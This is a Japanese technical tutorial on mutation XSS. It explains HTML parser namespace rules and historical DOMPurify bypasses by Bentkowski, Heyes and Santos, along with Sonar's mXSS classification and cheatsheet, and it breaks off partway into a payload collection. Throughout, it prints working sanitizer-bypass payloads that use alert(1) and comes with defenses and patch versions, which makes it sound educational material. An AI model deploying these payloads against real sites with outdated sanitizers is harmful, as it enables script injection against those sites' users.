- **MathML text integration point**: `<mi>` `<mo>` `<mn>` `<ms>` `<mtext>` の5要素。これらの**中身**は、（一部の例外を除いて）HTMLとして解析される。つまりMathMLの海の中に空いた「HTMLの島」である。
- **HTML integration point**: SVGの `<foreignObject>` `<desc>` `<title>`、および MathMLの `<annotation-xml>`（ただし属性 `encoding` が `text/html` か `application/xhtml+xml` のとき）。これらの中身もHTMLとして解析される。`<foreignObject>`はまさに「SVGの中に非SVG（＝HTML）を埋め込むため」の要素だ。

まとめると、パーサの「現在の名前空間」は `<svg>`/`<math>` で外部へ切り替わり、integration point で再びHTMLへ戻る、というように**入れ子の親子関係に応じて刻々と変化**する。この「親が誰か」で子の名前空間が決まる、という点が後の攻撃で決定的になる。

#### mglyph と malignmark という特別な例外

ここが多くのDOMPurify mXSSの心臓部である。HTML仕様には次の特別ルールがある。

> **`<mglyph>` と `<malignmark>` は、MathML text integration point（`<mtext>`など）の「直接の子」である場合に限り、HTMLではなくMathML名前空間の要素として扱われる。**

言い換えると、`<mtext>`の中は基本HTMLの島なのに、`<mglyph>`と`<malignmark>`という2つのタグだけは「島の中の飛び地」で、MathML名前空間に留まるのである。この例外があるおかげで、攻撃者は次のような細工ができる。

- **1回目のパース**では、`<mglyph>` が `<mtext>` の直接の子に「ならない」ように、間に別の要素（例: `<table>`）を挟んでおく。すると `<mglyph>` はHTML名前空間となり、その下の `<style>` もHTML名前空間の raw text 要素になり、DOMPurifyには無害に見える。
- ところが**DOMPurifyが間の要素を削除**したり、パーサの自動補正でその要素が消えたりすると、**2回目のパース**では `<mglyph>` が `<mtext>` の直接の子に「なってしまい」、MathML名前空間へ移る。すると配下の `<style>` は raw text でなくなり、中に隠しておいた `<img onerror>` が本物の要素として復活する。

これが「**名前空間混同（namespace confusion）**」の典型パターンである。要素が置かれる名前空間が、サニタイズ前後で食い違うことを指す。

#### なぜ名前空間が「混同」されるのか

根本原因は、**DOMPurifyが検査した木の形と、再パース後の木の形が、パーサの自動補正・ノード削除・所有権規則によってズレる**ことにある。DOMPurifyは「今見えているノードの名前空間」を基準に安全性を判断するが、その判断はノードの親子関係に依存し、親子関係はサニタイズによって変わり得る。攻撃者は「サニタイズがこの木をこう変形させ、その結果この要素の名前空間がHTML→MathML（またはその逆）へ切り替わる」という一手先を読んで、変異を仕込むわけである。

---

### 背景となる先行研究: Michał Bentkowski の DOMPurify < 2.0.17 バイパス（2020年）

2本の担当資料はいずれも、Michał Bentkowski（securitum）の先行研究「Mutation XSS via namespace confusion -- DOMPurify < 2.0.17 bypass」を土台にしている。理解の前提として、まずこれを簡潔に押さえる。

Bentkowskiは、次の形のペイロードでDOMPurify **2.0.17未満**をバイパスした。

```html
<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
```

- **なぜ動くのか**: `<svg>`でSVG名前空間に入り、直後の `<p>`（SVGに存在しないHTML要素）によってパーサが名前空間の切り替え・要素の自動補正を行う。1回目のパースでは `<style>` の中身は解析されず、`<g>` の `title` 属性値が文字列 `</style><img src=x onerror=alert(1)>` として格納される。DOMPurifyは「titleという無害な属性を持つ`<g>`」しか見えないので通過させる。ところが**再シリアライズ→再パース**すると、属性値中の `</style>` が `<style>` を閉じ、`<img onerror>` が本物の要素として出現して発火する。属性値のシリアライズが `<` `>` `/` をエスケープしないという前述の性質が土台になっている。

Bentkowskiが提案し採用された対策は、「**要素が正しい名前空間に置かれているかを、親要素の名前空間と照合して検証する**」というもの（DOMPurifyの`_checkValidNamespace`に相当）。これは以後の名前空間混同を防ぐ堅牢な土台となった。ただし後述する2つの研究は、この防御の「隙間」を突いて再びバイパスに成功する。

> 出典: Mutation XSS via namespace confusion -- DOMPurify < 2.0.17 bypass -- https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/

---

### Gareth Heyes「Bypassing DOMPurify again with mutation XSS」（DOMPurify < 2.1 / 2020年10月7日）

#### 攻撃の着想: 「コメントを見落としたパッチ」

Bentkowskiのバイパス（前節）を受けてDOMPurifyは **2.0.17** で対策を入れた。この対策は、**テキストノードの中に潜在的な変異を引き起こしうる怪しいマークアップが潜んでいないか**を検査するものだった。しかしHeyesは決定的な見落としに気づく。Heyes自身の言葉を借りれば、パッチは「**テキストノード内の潜在的な変異は検査していたが、決定的なことに、コメントについては考慮していなかった（looked for potential mutation inside text nodes but crucially didn't take into account comments）**」のである。

foreign content（SVG/MathML）の内側では、コメント（`<!-- -->`）やCDATAセクション（`<![CDATA[ ]]>`）はHTMLとは異なる特殊な扱いを受ける。そこに変異の起爆装置を隠せば、DOMPurifyのテキスト走査をすり抜けられるというわけだ。「同じDOMPurifyをもう一度（again）破る」という論文タイトルはこの再挑戦を指す。

#### Chromeで動くペイロードと逐次解説

HeyesがChrome向けに示したペイロードは次のとおりである。

```html
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```

- **なぜ動くのか（ステップで追う）**:
  1. `<math>` でMathML名前空間へ。`<mtext>` はMathML text integration point（HTMLの島）。
  2. その中に `<table>` を挟むことで、続く `<mglyph>` は `<mtext>` の**直接の子ではなくなる**。前述の特別ルールにより、直接の子でない `<mglyph>` はMathMLの飛び地にならず**HTML名前空間**にとどまる。よって配下の `<style>` もHTML名前空間の raw text 要素となり、中身（コメントや`<img>`）は**ただのテキスト**として扱われ、DOMPurifyには無害に見える。
  3. さらに危険な `<img src=1 onerror=alert(1)>` を **HTMLコメント越しに、しかも `title` 属性の値の中に、`&gt;`/`&lt;`（`>`/`<`のHTMLエンティティ）でエンコードして**隠しておく。DOMPurifyの「テキストノード検査」はコメントの内側を見ないため、この起爆装置を検出できない。
  4. **サニタイズによって `<table>` が処理・除去される**と、再パース時に `<mglyph>` が `<mtext>` の直接の子に昇格し、**MathML名前空間へ変異**する。すると `<style>` はもはや raw text 要素ではなくなり、`</style>` で閉じられた後の内容やコメントの解釈が変わる。属性値に隠されていた `--&gt;` がコメントを終端させ、`&lt;img src=1 onerror=alert(1)&gt;` がデコードされて本物の `<img>` 要素として出現、`onerror` が発火する。

要するに「`<table>`という詰め物で `<mglyph>` の名前空間をHTML側に固定してDOMPurifyを油断させ、サニタイズで詰め物が消えることで名前空間をMathML側へ変異させ、コメントの陰に隠した`<img>`を復活させる」という三段構えである。

#### Firefoxで動くペイロード（CDATA版）

ブラウザによってforeign content内のコメント/CDATAの扱いが微妙に異なるため、HeyesはFirefox向けに **CDATAセクション** を使う変種も提示している。

```html
<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

- **なぜ動くのか**: 骨格はChrome版と同一で、隠し場所がHTMLコメントから **CDATAセクション**（`<![CDATA[ ... ]]>`）に替わっている。Firefoxのforeign content解析ではCDATAが有効な特殊構文として処理されるため、`]]&gt;`（`]]>`のエンコード）でCDATAを終端させると、続く `&lt;/mglyph&gt;` と `&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;` がデコードされ、変異後の名前空間で本物の要素になる。

ここで注目すべきは `&Tab;` エンティティの使用である。`&Tab;` はタブ文字（U+0009）を表すHTMLエンティティだが、通常のスペースの代わりに属性区切りとして使える。変異によってこのエンティティがデコードされた後、パーサがタブ文字を属性間のセパレータとして認識し、`src=1` や `onerror=alert(1)` を `<img>` の独立した属性として正しく解析する。つまり **`&Tab;` がデコードされて属性区切りとして機能すること自体が、変異によって実際に新しいDOM要素が生成されたことの証拠**なのである。

#### Firefox代替ペイロード（コメント版）

Heyesは論文公開後のアップデートで、Firefox向けにCDATAではなくHTMLコメントを使う代替ペイロードも追加している。

```html
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

Chrome版と構造は似ているが、`title`属性値の中に `&lt;/mglyph&gt;` が追加されている点が異なる。変異後に `</mglyph>` がデコードされることで `<mglyph>` を明示的に閉じ、続く `<img>` がMathML名前空間から離脱してHTML要素として解析されるよう調整されている。ここでも `&Tab;` が属性区切りとして活用されている。

> 上記のペイロードで `&gt;`・`&lt;` を使うのは、DOMPurifyの1回目の検査時に「山括弧の生テキスト」として見えないようにするためである。エンティティは属性値の中では無害な文字列にすぎないが、名前空間が変異して`<style>`が要素解析される段になると、パーサがデコードして本物の山括弧として扱う。このタイミングのズレこそが変異XSSの本質だ。

#### 修正と教訓

Heyesが報告したこの一連のベクタは Cure53 によって **DOMPurify 2.1** で修正された（2020年）。教訓は明快だ。「テキストノードだけを検査しても、コメント・CDATAという"パーサ的な死角"に起爆装置を隠されると突破される」。サニタイザは、あらゆる文脈（コメント、CDATA、属性値、各名前空間）で一貫して安全でなければならない、ということである。

> 出典: Bypassing DOMPurify again with mutation XSS（Gareth Heyes, PortSwigger Research, 2020年10月7日公開） -- https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss

---

### Daniel Santos（@bananabr）による DOMPurify < 2.2.2 バイパス（2020年11月）

Heyesの修正（2.1）後、Daniel Santos（GitHub: @bananabr）は**新しい変異の引き金**を持ち込んで再びDOMPurifyを破った。この脆弱性はDOMPurifyのGitHub Issue #482として2020年11月2日に報告され、修正コミット `ee33fae`（"fix: Fixed a mXSS bypass reported in #482"）によって対処された。

#### ペイロードと名前空間の四段階横断

Santosが報告したペイロードは次のとおりである。

```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

このペイロードの最も際立った特徴は、**HTML → MathML → SVG → HTML** という4つの名前空間を横断する点にある。Heyesの攻撃がMathML内のコメント/CDATAを死角としたのに対し、Santosは**SVG名前空間混同（SVG namespace confusion）**を新たなガジェットとして導入した。

#### 変異の引き金: `<form>` 所有権変異ガジェット

HTML仕様には「**フォームは入れ子にできない**（a `<form>` cannot contain another `<form>`）」という制約がある。パーサは `<form>` の中でさらに `<form>` に出会うと、**2つ目の `<form>` を無視（ドロップ）**する。Santosはこの「2つ目のformが再パース時に消える」という挙動を、要素の**親を強制的に付け替える（＝所有権を変える）ガジェット**として利用した。

- **なぜ動くのか（ステップで追う）**:
  1. 1回目のパースでは、途中の `</form>` と2つ目の `<form>` があることで、`<mglyph>` は `<mtext>` の**直接の子にならない**構造として組まれる。よって `<mglyph>` はHTML名前空間にとどまる。
  2. `<mglyph>` の下に `<svg>` があり、そこから再びSVG名前空間へ入る。SVG内の `<mtext>` はMathMLではなくSVG要素として扱われ、その下の `<style>` はHTML名前空間の raw text 要素として機能する。危険な `<img onerror=alert(1)>` は `<path>` の `id` 属性値の中の文字列に過ぎず、DOMPurifyには無害に見える。
  3. しかし再パース時、**入れ子のformが許されず2つ目の`<form>`がドロップされる**ことで木の親子関係が変わり、`<mglyph>` が `<mtext>` の直接の子に昇格する。前述の特別ルールで**MathML名前空間へ変異**し、以降の名前空間の連鎖が崩れる。
  4. 名前空間の連鎖が崩れた結果、`<style>` は raw text 要素ではなくなり、`id` 属性値のシリアライズで露出した `</style>` が `<style>` を閉じ、続く `<img onerror=alert(1) src>` が本物の要素として出現して発火する。

「詰め物として何を使えば名前空間を変異させられるか」の答えが、Heyesの `<table>` から Santosの `<form>`（入れ子禁止という別の仕様）に替わった、と捉えると両者の連続性が見える。さらにSantosは `<svg>` を経由することで名前空間の横断回数を増やし、DOMPurify 2.1 で強化された検証の網の目をくぐり抜けている。

#### 修正と公開の時系列

Santosはこの脆弱性を **2020年11月2日**にCure53へ報告し（GitHub Issue #482）、修正コミット `ee33fae` によって対処された。修正では、名前空間検証の抜け穴（form所有権変異によって子の名前空間が事後的に変わるケース、およびSVGを経由した多段階の名前空間横断）を塞ぐよう、名前空間・親子関係のチェックが強化されている。

> 出典: GitHub Issue #482（Daniel Santos / @bananabr, 2020年11月2日） -- https://github.com/cure53/DOMPurify/issues/482 / 修正コミット `ee33fae` -- https://github.com/cure53/DOMPurify

---

### 実務者のためのまとめ: 攻撃の共通構造・防御・最新状況

#### 全バイパスに共通する「型」

ここまでの3研究（Bentkowski / Heyes / Santos）は、細部は違えど**同じ骨格**を共有している。攻撃者の思考モデルとして一般化すると次の4手順になる。

1. **危険な起爆装置を「無害な容れ物」に隠す**: `<style>`のraw text、属性値、コメント、CDATAなど、「1回目のパースでは要素にならない場所」に `onerror`/`onload` などを仕込む。
2. **名前空間を一時的にHTML側へ固定する詰め物を置く**: `<table>`、入れ子`<form>`、integration point要素（`foreignObject`/`annotation-xml`）などで、`<mglyph>`や`<style>`が「安全に見える名前空間」に留まるよう構造を作る。
3. **サニタイズが詰め物を消すことを見越す**: DOMPurifyが詰め物（table/2つ目のform/integration point要素）を除去・補正すると、親子関係が変わって名前空間が変異する。
4. **再パースで起爆装置が要素化して発火**: 名前空間変異により`<style>`が要素解析に切り替わり、隠していた`<img>`/`<iframe>`が本物の要素として蘇る。

#### 防御策

- **DOMPurifyを常に最新に保つ**: 本セクションのバイパスはいずれも既に修正済み（Bentkowski→2.0.17、Heyes→2.1、Santos→2.2.2、いずれも2020年）。これらの既知ベクタは最新版では成立しないが、**mXSSは構造的に新種が生まれ続ける**領域であり、バージョン追随が最重要。
- **サニタイズの結果を再びHTMLとして解釈させる経路を最小化する**: そもそも `innerHTML` などのHTML sinkへ流し込む回数を減らす。可能なら `textContent` で扱う、テンプレートエンジンの自動エスケープに任せる、など「2回目のパース」を発生させない設計にする。
- **CSP（Content Security Policy）による多層防御**: サニタイザ単独に依存せず、`script-src` の厳格化（`'unsafe-inline'` の排除、nonce/hash方式）や `require-trusted-types-for 'script'`（Trusted Types, DOM sinkへの生文字列代入を型で禁じる仕組み）を併用する。mXSSが万一成立しても、インラインスクリプトや`javascript:`の実行段でもう一段止められる。
- **設定の落とし穴に注意**: `ALLOWED_TAGS`/`ADD_TAGS` で `<style>`・`<svg>`・`<math>`・`foreignObject`・`annotation-xml` などを安易に許可すると、名前空間混同の素地を自ら作りかねない。必要最小限の許可リストにとどめる。

#### バージョン依存性についての注意（陳腐化に備えて）

本セクションのペイロードは、いずれも**特定バージョンでのみ有効な歴史的PoC**である（Bentkowski: DOMPurify < 2.0.17、Heyes: < 2.1、Santos: < 2.2.2。すべて2020年の事象）。現行のDOMPurifyでは通用しない。学ぶべきは個々の文字列そのものではなく、**「サニタイザが見た木」と「ブラウザが作る木」の不整合を、名前空間・integration point・所有権規則という仕様の隙間を使って作り出す**という**発想と原理**である。この原理を理解していれば、将来公開される新しいmXSS（別のガジェット、別のブラウザ差分）にも応用的に対処できる。

> 出典（横断的な確認に使用した情報源）:
> - DOMPurify 公式リポジトリおよび回帰テストフィクスチャ -- https://github.com/cure53/DOMPurify
> - Attack Classes & Bypass History（cure53/DOMPurify Wiki） -- https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
> - Mutation XSS via namespace confusion -- DOMPurify < 2.0.17 bypass（Michał Bentkowski, securitum） -- https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/

---

## mXSS解説とチートシート（Sonar）

このセクションでは、セキュリティ企業 Sonar（旧 SonarSource）が公開した2つの資料 ―― 解説記事「mXSS: The Vulnerability Hiding in Your Code」と、GitHub 上の「SonarSource/mxss-cheatsheet（mXSS チートシート）」―― を軸に、**mXSS（Mutation XSS、変異型クロスサイトスクリプティング）** を体系的に学びます。加えて、Sonar が発見した実在の脆弱性である **Joplin（CVE-2023-33726）** と **Mailspring（mXSS→RCE チェーン）** のケーススタディを通じて、mXSS が「アラートを出す遊び」ではなく **OS レベルの侵害に直結しうる脅威** であることを確認します。

反射型XSSのような「入力した文字列がそのまま実行される」タイプとは違い、mXSSは「サニタイズ（入力に含まれる危険な文字列を無害な形に変換・除去する処理）を通過した"安全に見える"文字列が、ブラウザによって再解釈される瞬間に危険なコードへ"変異（mutation）"する」という、より一段深い現象を扱います。ここが本セクション最大の学びどころです。

---

### mXSS（Mutation XSS）とは何か ―― 核心の一文

mXSS の核心は次の一文に集約されます。

> **サニタイザ（無害化処理）の目には「ただのテキスト（raw text）」として映る文字列を、ブラウザに渡した瞬間に「HTMLタグ」として解釈させる方法を見つけること。**

- **通常のXSS**: 攻撃者の `<script>` や `onerror=` が、フィルタの不備を"すり抜けて"そのまま出力される。
- **mXSS**: 攻撃文字列はサニタイズの段階では**確かに無害**である（サニタイザは正しく仕事をしている）。ところがその「無害化済みHTML文字列」を**ブラウザが描画のために再びパース（構文解析）し直す**とき、HTMLパーサの"癖"によって文字列の構造が組み替えられ（＝mutation／変異）、結果として `<img onerror=...>` のような実行可能な要素が出現してしまう。

つまり mXSS は「フィルタのバグ」ではなく、**"サニタイザが見たDOMツリー" と "ブラウザが最終的に構築したDOMツリー" が食い違う** という、パーサ（構文解析器）の仕様レベルの落とし穴を突きます。ここでいう **DOM（Document Object Model、HTMLをブラウザがツリー構造として保持したもの）** が、同じ入力文字列から2回作られるのに一致しない、という点が本質です。

Sonar の記事が強調する通り、**「マークアップへのいかなる小さな変更も、最終的なDOMツリーに大きな影響を与えうる（Any small change to the markup could have a major impact on the final DOM tree）」**。この事実が mXSS を強力かつ防御困難にしています。

#### 歴史的経緯（なぜ「mutation」と呼ぶのか）

- **2007年**: Yosuke Hasegawa（長谷川陽介）氏が、Internet Explorer で `innerHTML`（要素の中身をHTML文字列として読み書きするプロパティ）を読み戻すと文字列が"勝手に書き換わる"挙動を最初に報告。これが mXSS の原点とされます。
- **2013年**: Mario Heiderich らの論文 *"mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations"*（ACM CCS 2013）が、この現象を体系化し **mXSS** と名付けました。論文は、当時広く使われていたサーバサイドのサニタイザ（HTML Purifier, kses, htmlLawed, Google Caja 等）、クライアント側フィルタ（旧 IE XSS Filter、Chrome XSS Auditor）、WAF、IDS/IPS のいずれもが mXSS ベクタで回避されうることを示し、大きな衝撃を与えました。

> 出典: mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（Heiderich et al., ACM CCS 2013） — https://cure53.de/fp170.pdf

---

### Sonar の4分類 ―― mXSS パターンの体系化

Sonar の記事「mXSS: The Vulnerability Hiding in Your Code」は、mXSS を理解のために **4つのサブカテゴリ** に分割して整理しています。

#### 1. Parser Differentials（パーサ差分）

**サニタイザのパーサとブラウザのパーサの解釈が異なる**ことを突くパターンです。

最も有名な例が `<noscript>` 要素の挙動差です。`<noscript>` の中身がどう解釈されるかは、**JavaScript が有効か無効か（scripting フラグ）** によって変わります。

- サニタイザ内部で使われる `DOMParser` API はスクリプト無効とみなすため、`<noscript>` の中身を **raw text（ただのテキスト）** として扱う。
- 実ページではスクリプト有効なので、`<noscript>` の中身が **通常のHTMLとして解釈・実行される**。

```html
<noscript><style></noscript><img src=x onerror="alert(1)">
```

サニタイザは `</noscript>` までを `<noscript>` 内のテキストとみなし、`<img onerror>` もそのテキストの一部として無害と判断する。ところが実ページでは `<noscript>` の中身がHTMLとして解釈されるため、`<img onerror>` が本物の要素として出現し発火する。

#### 2. Parsing Round Trip（パース往復）

**HTMLをシリアライズ（文字列化）し、再びパースすると、異なるDOMツリーが生成される**パターンです。HTML仕様上、シリアライズ→再パースは冪等（べきとう＝何回やっても同じ結果になる性質）ではありません。

代表例はフォームの入れ子です。HTML仕様では `<form>` を入れ子にすることはできません。

```html
<form id="outer"><div></form><form id="inner"><input>
```

1回目のパースでは、2つ目の `<form>` は無視され、`<input>` は `outer` のフォームの子になります。しかしこのDOMをシリアライズして再パースすると、`</form>` で `outer` が閉じられた後に `inner` が有効な新しいフォームとして解釈され、**DOM構造が変わります**。

この性質を名前空間混同と組み合わせた高度なペイロードが以下です。

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

`<form>` の入れ子不可ルール、MathMLテキスト統合点（`<mtext>`）、`<mglyph>` の名前空間例外、`<style>` の raw text 解釈差を**直列に積み上げて**、サニタイザが見るDOMとブラウザが最終的に構築するDOMの間に最大の差分を作り出します。

#### 3. Desanitization（脱サニタイズ）

**サニタイズ後の処理が、無害化を台無しにする**パターンです。サニタイザ自体は正しく動作しているが、アプリケーションがサニタイズ済みHTMLに対して後から加工（要素の名前変更、属性の付け替え、文字列連結、別ライブラリへの再投入など）を行うことで、注入ベクタが復活します。

たとえば、サニタイズ後に SVG 要素の名前を変更すると、その要素の名前空間コンテキストが変わり、内部の `<style>` の解釈が raw text から通常のマークアップへ切り替わる ―― という形で変異が発生します。

このパターンで脆弱性が発見された実在のアプリケーションには、**osTicket**、**Mailspring**、**ProtonMail**、**Tutanota Desktop**、**Skiff Email** が含まれます。

#### 4. Context-Dependent Parsing（文脈依存パース）

**サニタイザがフラグメント（HTML断片）を解析する文脈と、アプリケーションが最終的にそのHTMLを埋め込む文脈が異なる**パターンです。

たとえばサニタイザは通常の HTML 文脈でフラグメントを解析しますが、アプリケーションがそのサニタイズ済みHTMLを SVG 名前空間の内部に挿入すると、`<style>` の解釈が変わり変異が発生します。ブラウザ間でもフラグメント解析の挙動に差異があり（後述のブラウザ差分を参照）、これも攻撃面を広げます。

> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

---

### ブラウザ HTMLパーサの再解釈メカニズム（原理編）

mXSS を"暗記"ではなく"理解"するには、**なぜ再パースで構造が変わるのか**をパーサの仕組みで押さえる必要があります。以下、mXSS を生む主要なメカニズムを分解します。

#### HTML コンテンツの7つのパース分類

HTMLパーサは要素を7つのカテゴリに分類し、それぞれ異なるルールで中身を解釈します。

| カテゴリ | 該当する要素の例 | 中身の扱い |
|---|---|---|
| **Void 要素** | `img`, `input`, `br`, `hr`, `meta` | 中身を持てない（自己閉じ） |
| **Raw text 要素** | `script`, `style`, `iframe` | テキストのみ。エンティティもデコードしない |
| **Escapable raw text** | `textarea`, `title` | テキストのみだがエンティティはデコードする |
| **Foreign content** | `svg`, `math` | 別の名前空間のルールで解釈 |
| **Normal 要素** | `div`, `span`, `p` 等 | 通常のHTMLマークアップとして解釈 |

mXSS の核心は、**同じ要素（典型的には `<style>`）が、所属する名前空間によって上記のどのカテゴリに分類されるかが変わる** ことにあります。

#### 名前空間（namespace）の切り替え ―― HTML / SVG / MathML

HTMLパーサは、DOMツリーの各要素に **名前空間（namespace）** という属性を割り当てます。名前空間は3種類あります。

- **HTML 名前空間**（既定）
- **SVG 名前空間**（`<svg>` 以下）
- **MathML 名前空間**（`<math>` 以下）

SVG と MathML の中身は **foreign content（外来コンテンツ＝HTML以外の文法で解釈される領域）** として扱われ、**通常のHTMLとは異なるパースルールが適用されます**。

この差が最もはっきり出るのが `<style>` 要素の扱いです。

| 文脈 | `<style>` の中身の扱い | 子要素を持てるか |
|---|---|---|
| **HTML 名前空間** | raw text（テキストのみ） | 持てない |
| **foreign content（SVG/MathML内）** | 通常のHTMLとして解釈しうる | **子要素を持てる** |

HTML 名前空間では `<style>` 内に書かれた `<img onerror=...>` はただのテキストです。ところが SVG 名前空間内の `<style>` では同じ文字列が**本物のHTML要素**として解釈されます。

```html
<svg><style><a alt="</style><img src=x onerror=alert(1)>">
```

このペイロードでは、SVG 内の `<style>` がもはや raw text 要素ではないため、`</style>` が閉じタグとして機能し、続く `<img onerror>` が実行可能な要素として出現します。

#### インテグレーションポイント（integration points）

名前空間はどこでも自由に切り替わるわけではなく、**インテグレーションポイント（integration point、＝外来コンテンツの中に"HTMLの島"を作れる境界要素）** で HTML に戻れます。

**SVG の HTML integration points:**
- `<foreignObject>`, `<desc>`, `<title>`

**MathML の HTML integration points（テキスト統合点）:**
- `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>`

**`<annotation-xml>`** は `encoding` 属性が `text/html` または `application/xhtml+xml` の場合にのみ HTML integration point として機能し、SVG を直接の子要素としてのみ埋め込めます。

#### `<mglyph>` と `<malignmark>` の罠

**`<mglyph>` と `<malignmark>`** は特殊な挙動を示します。MathML テキスト統合点（`<mi>`, `<mo>` 等）の**直接の子要素**である場合に限り、MathML 名前空間に留まります。他の要素は既定で HTML 名前空間になるのに対して例外的な挙動です。攻撃者は「HTML島の中にあるはずなのに、この2要素だけは MathML 側に引き戻される」という非対称性を使って、サニタイザの名前空間判定を欺きます。

#### `<image>` 要素の名前空間ブレーカー

SVG 名前空間内で `<image>` 要素が出現すると、ブラウザはこれを `<img>` に変換します。`<img>` は **foreign content breaker（外来コンテンツ脱出要素）** であるため、SVG 名前空間から HTML 名前空間へ強制的に切り替わります。

#### Foreign Content Breakers（外来コンテンツ脱出要素）一覧

以下の要素が foreign content（SVG/MathML）の中に出現すると、パーサは外来コンテンツを終了し HTML 名前空間に戻ります。

> `b`, `big`, `blockquote`, `body`, `br`, `center`, `code`, `dd`, `div`, `dl`, `dt`, `em`, `embed`, `h1`〜`h6`, `head`, `hr`, `i`, `img`, `li`, `listing`, `menu`, `meta`, `nobr`, `ol`, `p`, `pre`, `ruby`, `s`, `small`, `span`, `strong`, `strike`, `sub`, `sup`, `table`, `tt`, `u`, `ul`, `var`

これらの要素を意図的に foreign content 内に配置することで、名前空間の切り替えを制御し、サニタイザの予測と異なるDOMツリーを作り出すのが mXSS の常套手段です。

> 出典: mXSS cheatsheet（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/

---

### SonarSource mXSS チートシート ―― 要素ごとの予期しない挙動

SonarSource の mXSS チートシート（`sonarsource.github.io/mxss-cheatsheet`）は、「ブラウザのHTMLパース時の癖が引き起こす mutation を深掘りするためのワンストップ資料」として、要素ごとの予期しない挙動を網羅的に整理しています。

#### HTML 名前空間の要素

**Select:**
`<select>` 内に許可されない要素が出現すると、パーサはその要素を**削除**します。

```
入力:  <select><a>text</a></select>
結果:  <select>text</select>     ← <a> が消える
```

**Form（入れ子不可）:**
`<form>` は入れ子にできません。ただし `<div>` で分断すると2つ目のフォームが有効になる場合があります。

```
入力:  <form id="outer"><div></form><form id="inner"><input>
結果:  （再パース時に inner が有効なフォームとして出現）
```

**Table（foster parenting／里子出し）:**
テーブル内に許可されない要素が出現すると、パーサはその要素を**テーブルの直前へ移動**させます。

```
入力:  <table><a>text</a></table>
結果:  <a>text</a><table></table>     ← <a> がテーブルの外へ追い出される
```

**Anchor（入れ子不可）:**
`<a>` 要素同士は入れ子にできません。Active Formatting Elements の再構築アルゴリズムにより構造が変わります。

**Headings（見出しの入れ子）:**
見出し要素は入れ子にすると分割されます。

```
入力:  <h1><h2>text</h2></h1>
結果:  <h1></h1><h2>text</h2>
```

**Noscript:**
前述の通り、JavaScript の有効/無効で中身の解釈が完全に変わります。サニタイザでは最も危険な要素の一つです。

**`<br>` と `<p>`:**
HTML仕様上、終了タグだけで要素を生成できる唯一の要素群です。

```
入力:  </p>
結果:  <p></p>     ← 終了タグだけで要素が生まれる
```

**Plaintext:**
`<plaintext>` はHTMLで閉じることができません。一度開くと文書末尾まですべてがテキストとして扱われます。

**Textarea:**
`<textarea>` の中身はデコードされます（RCDATA要素）。HTMLコメント `<!-- -->` は `<textarea>` 内では解釈されません。

**Active Formatting Elements:**
以下の要素は「Active Formatting Elements」として特別な再構築アルゴリズムの対象になります。

> `a`, `b`, `big`, `code`, `em`, `font`, `i`, `nobr`, `s`, `small`, `strike`, `strong`, `tt`, `u`

これらの要素が閉じられずに残った場合、パーサは暗黙的にこれらを再適用するため、予期しないDOM構造が生まれます。

**NULL バイト:**
HTMLパーサは NULL バイト（`\x00`）を **U+FFFD（REPLACEMENT CHARACTER、文字コード 65533）** に変換します。

#### SVG 名前空間の要素

**HTML Integration Points:**
`<foreignObject>`, `<desc>`, `<title>` の内部では HTML 名前空間に戻り、通常のHTMLとして解釈されます。

**`<image>` 要素:**
SVG内では `<image>` は許可されていますが、ブラウザは内部でこれを `<img>` に変換します。`<img>` は foreign content breaker であるため、SVG 名前空間から脱出するトリガーになります。

#### MathML 名前空間の要素

**HTML Integration Points（テキスト統合点）:**
`<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` の内部では HTML 名前空間に戻ります。

**`<annotation-xml>`:**
SVG を埋め込めるのは**直接の子要素**としてのみです。

**`<mglyph>` / `<malignmark>`:**
HTML integration point の直接の子要素である場合に限り、MathML 名前空間に留まります（他の要素は HTML 名前空間になるのに対して例外）。

#### ブラウザ間の差異

同じHTMLでもブラウザによってDOMツリーの構築結果が異なるケースがあります。

```
入力:  <svg><div>text</div></svg>
```

| ブラウザ | 結果 |
|---|---|
| **Firefox** | `<svg><div>text</div></svg>` （`<div>` が SVG 内に留まる） |
| **Chrome / Safari 等** | `<svg></svg><div>text</div>` （`<div>` が SVG の外へ出る） |

この差異は、あるブラウザでは安全なペイロードが別のブラウザでは実行可能になりうることを意味し、サーバサイドのサニタイザにとって構造的な脅威です。

> 出典: mXSS cheatsheet（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/
> 出典: mXSS Explained（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/explained/

---

### 代表的なペイロード集

以下は、Sonar の記事・チートシートおよび権威ある研究から再現した代表的 mXSS ペイロードです。各ペイロードには **「なぜ動くのか」** を必ず添えます。

#### 例1: 古典 ―― `<listing>` / エンティティ・デコード（IE時代の原点）

```html
<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
```

- **なぜ動くのか**: 当時の IE は `<listing>`（古い整形済みテキスト要素）の `innerHTML` を読み戻すときにエンティティを `<`/`>` へデコードしてしまい、返り値が `<img src=1 onerror=alert(1)>` という本物のタグに変異した。文字列を再取得・再挿入するコードがあると、この変異した本物のタグが実行される。mXSS の"原点"となった挙動。

> 出典: mXSS Attacks（Heiderich et al., 2013） — https://cure53.de/fp170.pdf

#### 例2: `<noscript>` × scripting フラグ（Parser Differential）

```html
<noscript><style></noscript><img src=x onerror="alert(1)">
```

